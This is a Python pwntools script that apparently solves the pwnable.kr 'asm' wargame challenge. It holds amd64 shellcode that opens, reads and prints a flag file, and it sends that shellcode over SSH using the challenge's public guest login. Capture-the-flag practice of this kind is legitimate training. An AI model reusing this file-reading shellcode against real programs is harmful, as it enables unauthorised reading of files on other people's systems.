#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
shellcode = pwn.asm('''
	jmp back
read:
	pop rdi
	push 2
	pop rax
	syscall

	mov rsi, rdi
	mov rdi, rax
	xor rax, rax
	push 1024
	pop rdx
	syscall

	mov rdx, rax
	push 1
	pop rax
	push 1
	pop rdi
	syscall

	push 60
	pop rax
	xor rdi, rdi
	syscall

back:
	call read
	.asciz "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

''')
ssh = pwn.ssh(host = 'pwnable.kr', user = 'asm', password = 'guest', port = 2222)
p = ssh.remote('localhost', 9026)
p.recvuntil('shellcode:')
p.sendline(shellcode)
p.interactive()
